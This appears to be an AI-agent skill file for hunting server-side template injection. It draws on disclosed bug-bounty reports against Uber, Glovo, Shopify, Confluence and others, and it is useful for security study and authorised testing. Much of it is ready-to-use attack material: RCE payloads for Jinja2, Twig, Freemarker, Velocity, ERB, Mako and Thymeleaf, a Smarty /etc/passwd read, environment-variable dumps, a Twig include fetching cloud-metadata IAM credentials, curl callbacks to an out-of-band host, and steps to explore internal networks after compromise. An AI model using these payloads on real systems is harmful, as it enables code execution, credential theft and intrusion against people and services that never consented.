---
name: hunt-ssti
description: Hunting skill for server-side template injection (SSTI), built from 14 full disclosed reports (19 real reports cited) including Uber Jinja2 RCE via profile-name → confirmation email ($10,000), Unikrn Smarty → file_get_contents('/etc/passwd') via invite email, Glovo welcome-email {{7*7}} → "49, welcome to Glovo!", Shopify Return Magic email templates → prototype-chain disclosure, Mail.ru unpatched Atlassian Confluence CVE-2019-3396 ($2,000), lodash _.template → process.env exposure (CVSS 8.6), Rails render inline: params[:content] → ERB RCE, and a large cluster of AngularJS client-side template injection (CCTI) cases (Uber developer $3,000, WordPress mercantile reflected/stored, U.S. DoD, Acronis). Use when hunting RCE through template rendering — email templates, PDF/report generators, CMS preview editors, search-reflection, name/profile fields — and when distinguishing true server-side eval from client-side Angular reflection. Fingerprint the engine first, escalate to the engine-specific class-walker or Execute utility, and read the rendered sink (often an outbound email, not the web page).
sources: hackerone_public, github_security_lab, portswigger_research, cve_database, public_research
report_count: 19
full_reports_read: 14
---

## Crown Jewel Targets

SSTI is highest-value when user-controlled text is concatenated into a template string that the server then compiles and renders — especially when the render output lands somewhere you can read back. The 14 full reports read for this skill cluster hard around a small number of surfaces; rank your recon time accordingly.

- **Transactional / promotional email templates** — the single richest sink in the pack, appearing in 4 of 14 full reports. Profile name → welcome/confirmation mail (`#125980` Uber, `#1104349` Glovo), firstname/lastname/nickname → invite mail (`#164224` Unikrn), workflow email template editors (`#423541` Shopify Return Magic), password-reset mail field (`#1265344` Acronis). The browser shows nothing; **the evaluated output is in the inbox**. If you are only testing reflected response bodies you will miss this entire class.

- **Authenticated CMS / "documentation" template editors** — product-template, email-template, or "edit template" forms with a **preview** action. You control the whole template body, so there is no length limit, and a `preview`/`test email` action gives instant feedback. PortSwigger's "SSTI using documentation" class lives here. The Return Magic report (`#423541`) is exactly this shape: an admin-only workflow email editor with a "Send me a test email" button.

- **Search / filter / sort endpoints that reflect into the page title or results** — 5 of 14 full reports carry the `search-filter-sort` signal. `?q=wrtz{{7*7}}` → `wrtz49` (`#125027` Uber developer), `/search/{{2*2}}` → `4` in site title (`#230234` WordPress mercantile), `?Search={{7*7}}` → `49` (`#1736317` U.S. DoD). These are frequently **client-side** Angular CCTI rather than server RCE — easy to find, but classify before scoring.

- **Public, unpatched, known-CVE appliances** — Atlassian Confluence with CVE-2019-3396 (`#536130` Mail.ru, critical/$2,000). No fuzzing needed; version-check and exploit. Always check the appliance version before spending an hour on manual probes.

- **Open-source code you can actually read** — `render inline: params[:content]` in Rails' ujs test server (`#942103`), `_.template` in lodash 4.17.15 (`#904672`). Source review gives you the exact sink and the exact engine, removing all guesswork. The `public-code-search` and `js-source-review` signals appear in the pack alongside machine-findable detections from GitHub Security Lab (`#944359`, `#894872`, `#1490372`).

- **Name / bio / display fields with a hard length cap** — ≤30–64 characters blocks the one-liner RCE payload but not detection, class enumeration, or staged gadgets (`#125980` Uber explicitly notes "there is a length limit :("). A short cap is a speed bump, not a fix.

- **PDF / report / invoice generators** — the classic SSTI-to-RCE surface from the domain reference: a template fragment rendered into a downloadable artifact. If the artefact echoes your `{{7*7}}` as `49`, you have a readable server-side sink even when the page does not.

Payouts in the pack: **$10,000** (Uber Jinja2 RCE), **$3,000** (Uber developer reflected), **$2,300** (GitHub Ruby SSTI, `#1928279`), **$2,000** (Mail.ru Confluence RCE), **CVSS 8.6** (lodash). Several high-signal reports show `$0` bounty but top upvotes — `#423541` has 408 upvotes — so triage value and payout are not the same thing. Prioritize by reachable primitive, not by the bounty field.

### Quick triage rubric for a candidate surface

- **Readable output + server-side engine + dangerous built-in** → Critical RCE (aim for `id` output). This is the `#125980` / `#164224` shape.
- **Readable output + client-side Angular engine** → Medium XSS/P3, not RCE. This is the `#125027` / `#230234` / `#1736317` shape.
- **Object-graph traversal but no code exec yet** → still reportable and highly valued (`#423541`, 408 upvotes); describe the reachable primitives precisely.
- **Arithmetic reflection with no readable sink and a sandboxed engine** → low/informational until you prove something more.
- **Known CVE on a public appliance** → score by the CVE's impact, not by your probe effort (`#536130`).

---

## Attack Surface Signals

### Parameter Names to Hunt
```
name, firstname, first_name, lastname, last_name, nickname, display_name
username, bio, description, about, location, address, company, title
email, mail, to, from, subject, reply_to                # email-form sinks
q, query, search, Search, keyword, s, term, filter, sort, order
template, content, body, message, text, value, data, html
preview, render, view, format, tpl, tpl_id, templateId, productId
reason, return_reason, subject, note, comment, greetings
os, option, flag                                        # CLI brace-injection sinks
```

Field-name lessons from the reports:
- `firstname` / `lastname` / `nickname` were all injectable in `#164224` — the researcher was "not sure which field is vulnerable," so **inject all three at once when the mail is the sink** and bisect afterward.
- `First Name` on sign-up was the sink in `#1104349`; `profile name` in `#125980`.
- `location` in `savePublicInformation` triggered SSI in `#413655`.
- `mail` in a password-reset form was the sink in `#1265344` — note the payload was appended to a valid address (`sudo_bash{{8*8}}@wearehackerone.com`) rather than replacing it.
- `Search` (capital S) in `#1736317`; lowercase `q` in `#125027`; path-segment payload in `#230234`.

### Endpoints & Features
```
POST /register, /signup, /profile, /account/update          # name → email
POST /invite, /invite-user, /send, /share                   # invite mail
GET  /search?q=, /search/{payload}, /?s=, /News/Speeches?Search=
POST /password-reset/new, /forgot-password                  # mail field
POST /internal_api/v*/savePublicInformation                 # SSI-style
GET  /template?productId=N  → template-action=preview|save  # CMS editor
POST /api/*/preview, /api/*/render, /api/*/report, /export   # PDF/report
GET  /echo?content=, /error?content=                        # inline render
GET  /rails-ujs.js  (Rails test server, #942103)
```

A reliable triage habit: for every feature that **sends an email or renders a document**, register a fresh account, set the fields, trigger the send, and inspect the raw message. For every feature that **echoes a string into a page**, check the `<title>` and view-source — both `#230234` and `#125027` were found in the title/raw source, not the visible body.

### Five-minute recon sequence

1. Spider the authenticated app (not just the anonymous surface) and list every POST that contains an email, name, subject, location, template, or content field.
2. For each, register or use a controlled account and put a unique marker plus `{{7*7}}` in the field — e.g. `wrtz{{7*7}}` — so you can grep the response and the raw email for the marker.
3. Trigger every outbound message flow and check the inbox, including spam, before concluding "no reflection."
4. Separately, walk search endpoints with `?q=wrtz{{7*7}}` and path-segment variants; grep view-source and `<title>`.
5. When a hit appears, immediately run the engine-fork probes from the checklist in the same field.
6. If no hits at all, check public source and library versions for `render inline:` / `_.template` / known CVEs before moving on.

### Engine Fingerprints in Responses / Errors
```
Jinja2    → {{7*7}}=49, {{7*'7'}}=7777777; "jinja2.exceptions.UndefinedError"
Twig      → {{7*7}}=49, {{7*'7'}}=49 (numeric coercion); "Twig_Error"
Freemarker→ ${7*7}=49 AND #{7*7}=49; "freemarker.core"
Velocity  → ${7*7}=49; "#set($x=...)"; "org.apache.velocity"
Smarty    → {7*7}=template ERROR, {$smarty.version}, {php}...{/php}
ERB/Rails → <%= 7*7 %>=49; "ActionView::Template::Error"
Thymeleaf → *{7*7}=49; Spring stack traces
AngularJS → {{7*7}}=49 in DOM/title; "ng-", "angular.js", ng-bind attr
lodash    → ${...} in _.template(); escaped "<%= %>" in JS bundles
SSI       → <!--#config timefmt="..."--> causes 500
```

Error strings are especially valuable because they name the engine for free: "I began with the payload {7*7} and received a template error in the email I received" (`#164224`), which immediately pointed to Smarty and enabled `{$smarty.version}`.

### Tech-Stack Signals
- **Python/Flask/Django** → assume Jinja2 first; `{{config.__class__...}}` usually works. `#125980` is the canonical example.
- **Node.js/Express** → check for `_.template` (`#904672`), or `{{ this.__proto__... }}` in email templates (`#423541`), or Angular on the client (`#125027`).
- **PHP/Symfony** → Twig; `_self.env` callback chain. Plain PHP CMS → Smarty `{php}` tags (`#164224`).
- **Java/Spring** → Freemarker, Velocity, Thymeleaf; `?new()` Execute utility and `${...}` syntax.
- **Ruby on Rails** → ERB; look for `render inline:` in leaked source or public GitHub (`#942103`).
- **AngularJS in the page source** → `{{...}}` is almost certainly **client-side** CCTI → XSS, not server RCE. This distinction drives the whole report.
- **Internet-facing Confluence / Atlassian** → check CVE-2019-3396 patch level first (`#536130`).

---

## Discovery Patterns From 14 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **Email-producing forms and profile editors** (rank 1 — 4 of 14 full reports). *What to look for:* any field you can set that later appears in a confirmation, welcome, invite, or workflow email. Uber changed a profile name and watched `7777777` appear in the mail body (`#125980`); Glovo saw `49, welcome to Glovo!` as the subject (`#1104349`); Unikrn put `{php}` tags in firstname/lastname/nickname and invited a friend (`#164224`); Acronis injected into the password-reset mail field (`#1265344`). Always create a free account and trigger the outbound mail — **the sink is your inbox, not the response body**. If the mail is queued asynchronously, wait and re-check; do not conclude "not reflected" after one second.

2. **Search, filter, and sort parameters that echo into the page** (rank 2 — 5 reports tag `search-filter-sort`). *What to look for:* reflect a harmless arithmetic probe into `?q=`, `?Search=`, `?s=`, or the path and check the **page title and rendered source** for the evaluated number. WordPress mercantile: "I came across a potential exploitation vector after noticing that a search query for `{{2*2}}` returned `4` in the site title response" (`#230234`). Uber developer: "If you view the rendered source of the resulting page, you'll find the string 'wrtz49', showing the input has been evaluated" (`#125027`). DoD: "the search value `www.███████/News/Speeches?Search={{7*7}}` gets evaluated to `49` and put into the web page" (`#1736317`). Prefix your probe with a marker (`wrtz{{7*7}}`) so you can find it in a large response.

3. **Template editors and CMS preview forms** (rank 3 — `#423541`). *What to look for:* an authenticated "edit template / code view" with a **Send me a test email** or **preview** button. Enter `{{this}}`, `{{this.__proto__}}`, `{{this.__proto__.constructor.name}}` and read the test email. The Return Magic researcher saw `[Object Object]`, `[Object Object]`, `Object` and concluded the backend was Node.js. These forms are high-value because you control the entire template body — no length cap, no need to smuggle syntax through a constrained name field.

4. **Public source / dependency version review** (rank 4 — `js-source-review` 2, `public-code-search` 1). *What to look for:* leaked `render inline: params[:content]` (`#942103`), a pinned vulnerable library version (`_.template` in lodash 4.17.15, `#904672`), or a known CVE on an internet-facing appliance (Confluence CVE-2019-3396, `#536130`). The Rails researcher literally linked the GitHub source file and quoted the offending line. GitHub Security Lab's CodeQL/Semmle query reports (`#944359`, `#894872`, `#1490372`) mean these sinks are machine-findable at scale — mirror their queries against targets you are authorized to test.

5. **Unusual error responses / 500s from benign-looking fields** (rank 5 — `#164224`, `#413655`). *What to look for:* a `{7*7}` or SSI directive in a location field that returns a **template error** rather than literal text. "To start, I began with the payload {7*7} and received a template error in the email I received" (`#164224`); "inputing the following payload as the value of the location field causes a 500 server error" (`#413655`). A template error is a gift: it names the engine, and `#164224` followed it with `{$smarty.version}` and `{php}` tags to reach file read.

6. **CLI / parameter-injection surfaces** (rank 6 — `#3584149`). *What to look for:* an `os` or option-like parameter that reaches a shell string with brace expansion. `curl -os{system("sleep 10")}.read ...` produced a 200 and a 10-second delay with an OAST callback; the researcher wrote "the reponse 200 ok and the request wait 10 ms for finished." Timing plus a callback is a clean RCE proof even when output is not returned.

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

| Rank | Signal (full-report count) | Why it matters | What to probe |
|---|---|---|---|
| 1 | template-injection (12) | Direct marker of the vulnerability class; nearly every report is titled with it | `{{7*7}}`, `${7*7}`, `{7*7}`, `<%= 7*7 %>`, `*{7*7}` |
| 2 | template-engine (11) | The engine decides both syntax and RCE gadget; fingerprint before escalating | `{{7*'7'}}` → 7777777=Jinja2 / 49=Twig; `{$smarty.version}` |
| 3 | search-filter-sort (5) | Reflected arithmetic in a title/results is the easiest blind find | `?q=wrtz{{7*7}}`, `/search/{{2*2}}`, `?Search={{7*7}}` |
| 4 | server-side-rendering (5) | Confirms the value is compiled, not merely echoed | Compare literal `{{7*7}}` against evaluated `49` in raw HTML |
| 5 | api-endpoint (3) | JSON/REST surfaces often bypass UI-side validation | Send the payload in body fields, not just the query string |
| 6 | prototype-pollution (2) | Node template contexts expose the object graph | `{{this.__proto__.constructor.name}}`, `{{this}}` in email tpl |
| 7 | reflected (2) | Immediate feedback loop in the response | View-source, not just the rendered DOM |
| 8 | js-source-review (2) | Sink and engine are visible in code | grep `_.template`, `render inline:`, `res.render` |
| 9 | internal-network (2) | SSTI RCE lands on an internal worker with metadata access | After RCE, check IMDS and internal services |
| 10 | dos-resource (2) | Resource-exhaustion side effect can be the only observable signal | `{{8*8}}` reflection, `<!--#config ...-->` → 500 |
| 11 | path-traversal-lfi (1) | Smarty `{php}` + `file_get_contents` = arbitrary file read | `{php}file_get_contents('/etc/passwd'){/php}` |
| 12 | command-injection (1) | Endgame: template → OS command | `popen('sleep 10')`, `system("sleep 10")` + OAST |
| 13 | stored / self-xss (1 each) | AngularJS CCTI stored in profile → XSS for later viewers | `{{constructor.constructor('alert(1)')()}}` |
| 14 | dependency-confusion (1) | A vulnerable library version is public knowledge | Check package.json / npm version against CVEs |
| 15 | misconfiguration (1) | Unpatched appliance = instant critical | Confluence CVE-2019-3396 version check |
| 16 | admin-internal (1) | Authenticated template editors are real attack surfaces | `productId` in query, `template-action=preview` in body |
| 17 | sso-oauth (1) | Sample apps / docs under a main domain are softer targets | `developer.<domain>`, `/docs/` search boxes (`#125027`) |

The top two signals — template-injection and template-engine — co-occur in 11 of 14 reports. Operationally this means you should never stop at the arithmetic probe: the moment `{{7*7}}` evaluates, run the engine-fork probes (`{{7*'7'}}`, `${7*7}`, `#{7*7}`) in the same request batch, because the RCE payload is entirely engine-specific.

### Verbatim Discovery Clues

Real, verbatim "how I found it" lines from the disclosed reports — all reproduced from the study pack. These are the exact phrasings researchers used, preserved so you can recognize the same tells in the wild.

**Direct discovery / "I found it" lines:**

- **[#164224]** "I've found an issue which has allowed me to execute file_get_contents and extract your /etc/passwd file."
- **[#164224]** "version} Next I was able to test {php} tags by using ```{php}print "Hello"{/php}``` ."
- **[#230234]** "I came across a potential exploitation vector after noticing that a search query for `{{2*2}}` returned `4` in the site title response."
- **[#3584149]** "i tried to injected the os parmeter"
- **[#250837]** "Hello Sir , I found Stored XSS in https://mercantile."
- **[#1265344]** "I found Template Injection in [https://access."

**Email-sink discovery lines:**

- **[#125980]** "First, if you change your profile name to {{ '7'*7 }}, and you will receive a mail 'Your Uber account information has been updated' sent by support@uber.com"
- **[#125980]** "And in mail body, you can see your name become '7777777'"
- **[#125980]** "I think it can be a Remote Code Execution vulnerability but there is a length limit :("
- **[#1104349]** "when an attacker signs up on the platform and uses a payload in the First Name field, the payload is rendered server side and it gets executed in the promotional/welcome emails sent to the user"
- **[#1104349]** "Notice that the email arrives with the Subject as `49, welcome to Glovo!`"
- **[#423541]** "I've been playing with return magic workflow email templates and there seems to be some kinda of template injection but I am not sure if it's exploitable or even valid."
- **[#423541]** "`{{ this }}` -> `[Object Object]`"
- **[#423541]** "`{{ this.__proto__.constructor.name }}` --> `Object` ... I couldn't go further but it seems like the backend is NodeJs."
- **[#164224]** "To start, I began with the payload {7*7} and received a template error in the email I received"
- **[#423541]** "I set the email template to the following and then test the template and then the results go to my gmail inbox."

**Response / source-review discovery lines:**

- **[#125027]** "If you view the rendered source of the resulting page, you'll find the string 'wrtz49', showing the input has been evaluated."
- **[#942103]** "I have found in the server code for testing ujs in Rails that template injection is possible and that leads to rce."
- **[#942103]** "`render inline: params[:content]` receives the request value directly and can be executed as ERB code as it is"
- **[#904672]** "The _.template function of the lodash package does not properly validate user-supplied input."
- **[#904672]** "An attacker can inject code such as Javascript within parenthesis for example `parameter=${JSON.stringify(process.env)}` which will be executed"
- **[#1736317]** "This endpoint has a search functionality with the parameter `Search`. The supplied value to this parameter gets embedded into the website."
- **[#1736317]** "For example the search value `www.███████/News/Speeches?Search={{7*7}}` gets evaluated to `49` and put into the web page"
- **[#413655]** "inputing the following payload as the value of the location field causes a 500 server error"
- **[#3584149]** "the reponse 200 ok and the request wait 10 ms for finished"
- **[#536130]** "Unpatched CVE-2019-3396 (and few more) in publicly accessible Atlassian Confluence instance in ESForce domain."
- **[#250837]** "Although its self XSS. but following attack scenario makes it useful." — the researcher then described creating an account with someone else's unverified email to make the stored payload hit a real victim.

### Probe Checklist (15 concrete probes)

Send these one field at a time, in this order, and check **response, view-source, and any outbound email**. Never batch multiple payloads into one field — you need to know which syntax evaluated.

| # | Probe | Expected result / target engine | Report anchor |
|---|---|---|---|
| 1 | `{{7*7}}` | `49` on Jinja2/Twig/Angular; literal if not injected | `#125027`, `#1104349` |
| 2 | `${7*7}` | `49` on Freemarker/Velocity/Mako/lodash | domain ref |
| 3 | `{7*7}` | `49` or a **template error** on Smarty | `#164224` |
| 4 | `<%= 7*7 %>` | `49` on ERB | `#942103` |
| 5 | `*{7*7}` | `49` on Thymeleaf/Spring | domain ref |
| 6 | `{{7*'7'}}` | `7777777` = Jinja2, `49` = Twig (engine fork) | domain ref, `#125980` |
| 7 | `#{7*7}` | `49` **with** `${7*7}` → `49` = Freemarker confirmation | domain ref |
| 8 | `{{this}}`, `{{this.__proto__.constructor.name}}` | `[Object Object]`, `Object` for Node/prototype-walk | `#423541` |
| 9 | `{$smarty.version}` | Version string → match to known Smarty gadgets | `#164224` |
| 10 | `{{constructor.constructor('alert(document.domain)')()}}` | AngularJS CCTI → XSS | `#230234`, `#250837` |
| 11 | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | Jinja2 RCE proof | `#125980` technique |
| 12 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | Freemarker RCE | domain ref |
| 13 | `${JSON.stringify(process.env)}` | lodash `_.template` env disclosure | `#904672` |
| 14 | `<!--#config timefmt="A %B %d %Y %r"-->` | 500 / SSI signal | `#413655` |
| 15 | `popen('sleep 10')` / `system("sleep 10")` with an OAST URL | Timing + callback RCE proof | `#3584149` |

Interpreting the matrix:
- **Literal `{{7*7}}` in the response** does not always mean "not vulnerable" — it can be swallowed by an HTML attribute (`<input value="{{7*7}}">`) or returned in an email rather than the page. Retry with `{{ '7'*7 }}` and check the inbox.
- **A template error is a positive signal**, not a failure. `#164224` turned one into `{$smarty.version}`, then `{php}` tags, then `/etc/passwd`.
- **Arithmetic in the page title is usually CCTI** — go to `hunt-xss`, not the RCE chain.
- **`7777777` vs `49` from `{{7*'7'}}`** is the single cheapest engine-fork test in the whole playbook; run it every time.

### What Is NOT SSTI (negative signals that waste time)

- **Literal echo** — if `{{7*7}}` comes back as the exact string `{{7*7}}` in the response, raw email, and source, the value is escaped or inserted as data. That is not injection. Some engines deliberately render templates only from files, not from strings.
- **Client-side interpolation only** — AngularJS `{{7*7}}` → `49` in the DOM is CCTI/XSS. It is a real finding, but it is not server-side template injection and must not be scored as RCE (`#125027`, `#230234`, `#250837`, `#1736317`, `#1265344`).
- **Error-string formatting** — a server that returns `"template not found: {{7*7}}"` is echoing your input into an error string, not evaluating it. Look for the evaluated numeric result, not the presence of your payload in the message.
- **Search-engine / WAF artifacts** — a search box that "evaluates" `2*2` via its own query parser (rather than a template expression) will also evaluate `{{2*2}}` inconsistently. Confirm with `{{7*'7'}}`: a real Python Jinja2 engine returns `7777777`, a numeric parser returns `49` or nothing.
- **Reflected XSS mistaken for SSTI** — if `<script>` executes but arithmetic does not evaluate, you have XSS. `#1736317` is instructive: the report is titled XSS via CCTI, not SSTI RCE.

---

## Step-by-Step Hunting Methodology

1. **Inventory every user-writable string** that is stored or echoed — profile fields, names, bios, emails, subjects, search queries, template bodies, location/address, comments. Use the parameter list in Attack Surface Signals. Prioritize anything that feeds an outbound message.

2. **Create a controlled account and trigger all outbound email flows** — registration, welcome, password reset, invite-a-friend, workflow test mail. If a field appears in the mail, you have a readable render sink even when the web app escapes it. This is how Uber, Glovo, Unikrn, and Shopify Return Magic were found. Read the **raw MIME source**, not just the pretty-rendered preview.

3. **Fingerprint before firing RCE.** Send probes 1–9 from the checklist and read the result. Do NOT assume Jinja2:
   - `{{7*7}}` literal but `${7*7}` → `49` → **Freemarker**; stop sending `{{config...}}`.
   - `{7*7}` returns a template error → **Smarty**; go to `{php}` tags and `{$smarty.version}`.
   - `{{7*'7'}}` → `7777777` → **Jinja2**; → `49` → **Twig**.
   - Only the page title changed, and `alert(1)` payloads execute → **client-side AngularJS**, report as XSS.

4. **Locate the exact reflection context.** Check response body, HTML attributes (`<input value="{{7*7}}">` swallows arithmetic — a known false negative), page `<title>`, and raw view-source. Prefix probes with a unique marker (`wrtz{{7*7}}`) so they are findable in large responses. For email sinks, check the subject line too — `#1104349` put `49` in the subject, not the body.

5. **Try Jinja2 RCE first** on Python/Flask stacks — it covers the most common modern stack:
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   For a traditional web form send `application/x-www-form-urlencoded` body (`field={{...}}`), **NOT JSON** — `request.form['field']` ignores JSON silently. This is the single most common reason a correct payload appears to "do nothing."

6. **Handle length-constrained fields.** If the name field caps input (~30–64 chars), send `{{ '7'*7 }}` to confirm, then enumerate in stages:
   ```
   {{ [].__class__.__base__.__subclasses__() }}
   {{ ''.__class__.mro()[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
   ```
   Read the evaluated output in the **email body** (`#125980`). Loops are another compact primitive from that report: `{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}`.

7. **Work the authenticated template editor class** if present. Three rules:
   - *Fingerprint first* — the engine decides the syntax. Freemarker does not respond to `{{...}}` at all.
   - The record id is usually a **query param** (`POST /…/template?productId=N`), with the body carrying only `csrf`, `template`, and `template-action`. Putting the id in the body returns `400 "Missing product id"`.
   - GET the page for a fresh CSRF each iteration and use `template-action=preview` for fast feedback; switch to `template-action=save` only when the payload is confirmed, then load the public page that consumes the template to fire it.

8. **Escalate to the engine-specific gadget** — Twig `_self.env` callback, Freemarker `?new()` Execute, ERB backticks, Velocity `getClass().forName("java.lang.Runtime")`, Smarty `{php}`. Full payloads in Payload & Detection Patterns. On Node/lodash, use `${JSON.stringify(process.env)}` for an immediate high-impact disclosure.

9. **Prove execution unambiguously** — return `uid=N(user) gid=...` from `id`, or trigger a unique OAST/DNS callback via `sleep`+`curl` (`#3584149`). Format of the output is irrelevant; content is the evidence. A 10-second delay plus a callback is enough when output is suppressed.

10. **Check for known-CVE shortcuts** on appliances before manual fuzzing — Confluence CVE-2019-3396 (`#536130`) is a version check away from a critical finding. Also check pinned library versions for `_.template`-class bugs (`#904672`).

11. **Classify server vs client** before scoring. If evaluation happens in the browser (AngularJS `{{7*7}}` in title, `alert(1)` payloads), this is CCTI/XSS — report as such. Only claim RCE when the render is demonstrably server-side. `#250837` is a useful model: self-XSS was escalated by noting the app allowed account creation with someone else's unverified email, making the stored payload hit a real victim.

12. **After RCE, enumerate blast radius** — the `internal-network` signal appears in 2 full reports. Check IMDS and internal services from the rendering worker, and look for source-code or environment disclosure before reporting.

13. **Document the full chain** — request with payload, response/view-source or raw email showing evaluated output, engine fingerprint, RCE proof, and the exact field name. Screenshots of each hop. Note asynchronous mail delays so the reproducer knows to wait.

---

## Payload & Detection Patterns

### Universal Detection Matrix (send all, read which one evaluates)
```
{{7*7}}          → 49          = Jinja2 / Twig / AngularJS
${7*7}           → 49          = Freemarker / Velocity / Mako
#{7*7}           → 49 (w/ $)   = Freemarker
{7*7}            → 49 or ERROR = Smarty
<%= 7*7 %>       → 49          = ERB (Ruby)
*{7*7}           → 49          = Spring Thymeleaf
{{7*'7'}}        → 7777777     = Jinja2 (Python string repetition)
{{7*'7'}}        → 49          = Twig (numeric coercion)
```

A compact decision tree:
```
{{7*7}} evaluates?
├─ NO  → try ${7*7}, {7*7}, <%= 7*7 %>, *{7*7}
│        ├─ {7*7} ERROR       → Smarty → {$smarty.version} → {php}
│        ├─ ${7*7} + #{7*7}   → Freemarker → ?new() Execute
│        ├─ ${7*7} only       → Velocity / Mako
│        └─ <%= 7*7 %>        → ERB → backticks
└─ YES → {{7*'7'}}?
         ├─ 7777777 → Jinja2 → config.__class__.__init__.__globals__
         ├─ 49      → Twig    → _self.env.registerUndefinedFilterCallback
         └─ only in DOM/title → AngularJS CCTI → alert(1), NOT RCE
```

### Jinja2 / Flask — RCE & Enumeration
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{ '7'*7 }}                                   # short detection, fits length caps
{{ [].__class__.__base__.__subclasses__() }}   # dump classes, pick gadget index
{{ ''.__class__.mro()[1].__subclasses__()}}    # variant from #125980
{{ ''.__class__.mro()[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
{% for c in [1,2,3] %}{{c,c,c}}{% endfor %}     # loop primitive from #125980
{%print(request.application.__globals__['os'].popen('id').read())%}
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}
```
`#125980` used the short probe `{{ '7'*7 }}` precisely because the profile-name field was length-limited; the class-dump and loop payloads were the enumeration tools that replaced the full one-liner.

### Twig / PHP — RCE via Undefined Filter Callback
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}   # also SSRF
```
Twig coerces `'7'` to a number, so `{{7*'7'}}` → `49` — this is the fork that separates it from Jinja2.

### Smarty / PHP — RCE & File Read
```
{7*7}                                    # initial template error = fingerprint
{$smarty.version}                        # version disclosure
{php}print "Hello"{/php}                 # confirm PHP tag execution
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
```
The progression in `#164224` is worth memorizing: arithmetic → error → version → `print "Hello"` → file read. Each step confirmed the engine before the next, more invasive step.

### Freemarker / Java — Execute Utility (documented technique)
```
${7*7}  AND  #{7*7}  →  49          # fingerprint
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```
`{{...}}` does nothing in Freemarker; do not waste attempts with Jinja2 payloads once the `${...}`/`#{...}` fork fires.

### ERB / Ruby — Inline Render
```
<%= `id` %>
<% `touch me` %>                         # #942103 PoC
# vulnerable source: render inline: params[:content], content_type: params[:content_type]
# PoC URL: /?content=<%= `id` %>&content_type=text/html
```
`#942103` found this by reading public source: `data = { params: params.to_unsafe_h }.update(request.env)` followed by `render inline: params[:content]`. When you can read the source, quote the exact vulnerable line in your report.

### Velocity / Java
```
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("exec", $e.getClass()).invoke($e, "id")
```

### AngularJS / Angular — CCTI → XSS (client-side, NOT server RCE)
```
{{7*7}}                                              → 49 in title/source
{{constructor.constructor('alert(document.domain)')()}}
{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}   # IE11 sandbox escape, #125027
```
Five of the 14 reports are this class. Treat them as real XSS findings but **never** claim server RCE from them.

### Node.js / lodash / Prototype Walk
```
${JSON.stringify(process.env)}                       # lodash _.template, #904672
{{ this }}                       → [Object Object]
{{ this.__proto__ }}             → [Object Object]
{{ this.__proto__.constructor.name }} → Object        # #423541
{{ this.__proto__.constructor.constructor('return process')().env }}
```

### SSI / Server-Side Include
```
<!--#config timefmt="A %B %d %Y %r"-->               # 500 error signal, #413655
```
`#413655` reached this through `location` in `savePublicInformation` after login; keep it in the checklist for SSI-style template processors.

### CLI / Shell-Brace Injection
```
curl -os{popen('sleep 10').read()} --url https://YOUR_ID.oast.fun
curl -os{system("sleep 10")}.read --url https://YOUR_ID.oast.fun   # #3584149
```
Note the first form produced a globbing error while the second returned 200 with a delay — a useful reminder that the shell/parser may mangle your first attempt; iterate on syntax before concluding failure.

### Secondary Engines — Mako, Spring, Smarty-less PHP
```
Mako (Python)      → ${7*7};  <%import os%>${os.popen('id').read()}
Thymeleaf (Spring) → *{7*7};  __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
Velocity (Java)    → #set($x=7*7)${x};  $class.inspect("java.lang.Runtime")
General Java       → ${T(java.lang.Runtime).getRuntime().exec("id")}
```
These are lower-frequency in the pack but the universal matrix will surface them: if `${7*7}` evaluates and the Jinja/Twig forks do not, walk this list before giving up.

### Where Evaluated Output Lands (check every one)
```
1. HTTP response body — the common case for search/reflection findings.
2. Raw HTML source / <title> — #125027 and #230234.
3. Email body — #125980, #1104349, #164224, #423541.
4. Email subject line — #1104349 ("49, welcome to Glovo!").
5. Rendered PDF / report / invoice — domain reference generator sinks.
6. Error / stack-trace message — #164224's initial template error.
7. Timing + OAST callback — #3584149 when output is suppressed.
8. Stored profile/account page — #250837.
```
If you checked only #1, you have checked roughly half the surfaces in this corpus. Always enumerate the sink before declaring a probe negative.

### Grep Patterns for Source Review
```bash
grep -rE "render inline:|\.template\(|render_template_string|Template\(|\.render\(" --include="*.rb" --include="*.js" --include="*.py"
grep -rE "_(template|compile)|new Function|eval\(" --include="*.js"
grep -rE "freemarker|velocity|thymeleaf|smarty|jinja" package.json pom.xml Gemfile requirements.txt
grep -rE "params\[:(content|template|name)\]|request\.(form|args)\[" --include="*.rb" --include="*.py"
```

---

## Common Root Causes

1. **User input concatenated into a template string** — the defining bug. `render inline: params[:content]` (`#942103`), `_.template` fed a request parameter (`#904672`), `{{ '7'*7 }}` rendered from a profile name (`#125980`). The feature is legitimate; composing the template at runtime with untrusted data is not.

2. **The render sink is invisible to the tester** — email templates are the prime example. Developers assume nobody reads the raw mail, so escaping is skipped. `#125980`, `#1104349`, `#164224`, `#423541`, and `#1265344` all relied on the researcher opening an inbox. A web-only test pass misses all five.

3. **No engine sandbox / dangerous built-ins exposed** — Smarty's `{php}` tags, Freemarker's `Execute` utility, Jinja2's `config`/`__globals__` class-walker, Twig's `_self.env`. The template language itself exposes the runtime, so "template injection" and "RCE" are almost the same finding on these engines.

4. **Prototype chain left reachable in Node template contexts** — `{{this.__proto__.constructor.name}}` returning `Object` (`#423541`) shows the object graph is traversable from inside the template. This is the same trust failure that powers the `prototype-pollution` signal in 2 reports.

